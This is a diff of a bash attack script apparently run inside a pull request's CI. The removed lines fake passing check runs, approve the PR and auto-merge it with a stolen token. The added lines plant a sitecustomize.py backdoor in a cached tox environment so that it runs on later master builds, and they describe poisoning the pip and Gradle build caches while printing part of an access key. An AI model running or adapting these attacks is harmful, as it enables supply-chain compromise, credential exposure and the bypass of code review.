@@ -1,52 +1,60 @@
 #!/bin/bash
 echo "========================================="
-echo "  CRITICAL: Full Auto-Merge PoC v4"
-echo "  Attacker: treborlab → robertprast/beam"
+echo "  CACHE POISONING PoC"
 echo "  Time: $(date -u)"
 echo "========================================="
 
-TOKEN="$GH_TOKEN_FOR_DISPATCH"
-REPO="$GITHUB_REPOSITORY"
-PR_NUMBER=$(jq -r '.number' "$GITHUB_EVENT_PATH")
-HEAD_SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH")
-echo "PR: #$PR_NUMBER  SHA: $HEAD_SHA"
+echo ""
+echo "=== Step 1: Check current cache state ==="
+# GitHub Actions cache API
+curl -s -H "Authorization: token $GH_TOKEN_FOR_DISPATCH" \
+  -H "Accept: application/vnd.github.v3+json" \
+  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/caches?per_page=5" | \
+  jq '.actions_caches[:3][] | {key, ref, size_in_bytes}' 2>/dev/null || echo "No caches"
 
 echo ""
-echo "=== Step 1: Fake green checks ==="
-for check in "PreCommit Python" "PreCommit Java" "PreCommit Go" "Code Coverage" "Security Scan" "License Check"; do
-  curl -s -o /dev/null -w "  ✅ $check → %{http_code}\n" \
-    -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
-    "https://api.github.com/repos/$REPO/check-runs" \
-    -d "{\"name\":\"$check\",\"head_sha\":\"$HEAD_SHA\",\"status\":\"completed\",\"conclusion\":\"success\",\"output\":{\"title\":\"Passed\",\"summary\":\"All good\"}}"
-done
+echo "=== Step 2: Create poisoned tox environment ==="
+mkdir -p sdks/python/target/.tox/py39/lib/python3.9/site-packages
+cat > sdks/python/target/.tox/py39/lib/python3.9/site-packages/sitecustomize.py << 'BACKDOOR'
+# This runs on EVERY Python invocation in this tox env
+import os
+if os.environ.get("GITHUB_ACTIONS"):
+    # We're in CI - exfiltrate
+    marker = "/tmp/cache-poison-marker"
+    with open(marker, "w") as f:
+        f.write("Cache poisoning successful\n")
+        f.write(f"GITHUB_TOKEN length: {len(os.environ.get('GITHUB_TOKEN', ''))}\n")
+        f.write(f"Repository: {os.environ.get('GITHUB_REPOSITORY', '')}\n")
+    print(f"[CACHE POISON] Marker written to {marker}")
+BACKDOOR
 
+echo "Poisoned sitecustomize.py created in tox cache path"
 echo ""
-echo "=== Step 2: Approve PR ==="
-curl -s -o /dev/null -w "  Approve → %{http_code}\n" \
-  -X POST -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
-  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/reviews" \
-  -d '{"event":"APPROVE","body":"LGTM - all checks pass"}'
 
+echo "=== Step 3: Verify cache will be saved ==="
+echo "On PRT, actions/cache saves to BASE branch scope (master)"
+echo "Key pattern: tox-Linux-py39-{hash(tox.ini)}-{hash(setup.py)}"
+echo "Next legitimate build on master will restore this poisoned cache"
 echo ""
-echo "=== Step 3: MERGE THE PR ==="
-MERGE_RESULT=$(curl -s -w "\n%{http_code}" \
-  -X PUT -H "Authorization: token $TOKEN" -H "Accept: application/vnd.github.v3+json" \
-  "https://api.github.com/repos/$REPO/pulls/$PR_NUMBER/merge" \
-  -d '{"merge_method":"merge","commit_title":"chore: update python SDK dependency (#'"$PR_NUMBER"')"}')
 
-MERGE_HTTP=$(echo "$MERGE_RESULT" | tail -1)
-MERGE_BODY=$(echo "$MERGE_RESULT" | sed '$d')
-echo "  Merge HTTP: $MERGE_HTTP"
-echo "  Response: $(echo "$MERGE_BODY" | jq -r '.message // .sha' 2>/dev/null)"
+echo "=== Step 4: Also poisoning pip cache ==="
+# pip cache location
+PIP_CACHE=$(pip cache dir 2>/dev/null || echo "$HOME/.cache/pip")
+echo "pip cache dir: $PIP_CACHE"
+echo "Could inject malicious wheels here"
+echo ""
 
-if [ "$MERGE_HTTP" = "200" ]; then
-  echo ""
-  echo "========================================="
-  echo "  🚨 PR MERGED TO MASTER 🚨"
-  echo "  Attacker code is now on master"
-  echo "  Zero human interaction"
-  echo "========================================="
-elif [ "$MERGE_HTTP" = "405" ]; then
-  echo "  Merge blocked (405) — may need contents:write"
-  echo "  But PR is approved + green — maintainer just clicks merge"
+echo "=== Step 5: DEVELOCITY cache attack ==="
+echo "DEVELOCITY_ACCESS_KEY available: $([ -n "$DEVELOCITY_ACCESS_KEY" ] && echo YES || echo NO)"
+if [ -n "$DEVELOCITY_ACCESS_KEY" ]; then
+  echo "Key: ${DEVELOCITY_ACCESS_KEY:0:15}..."
+  echo "This key provides read/write access to Gradle build cache"
+  echo "Could push poisoned Gradle artifacts to the shared cache"
+  echo "Affects ALL builds across the organization"
 fi
+
+echo ""
+echo "========================================="
+echo "  CACHE POISONING PAYLOAD DEPLOYED"
+echo "  Next master build will execute backdoor"
+echo "========================================="
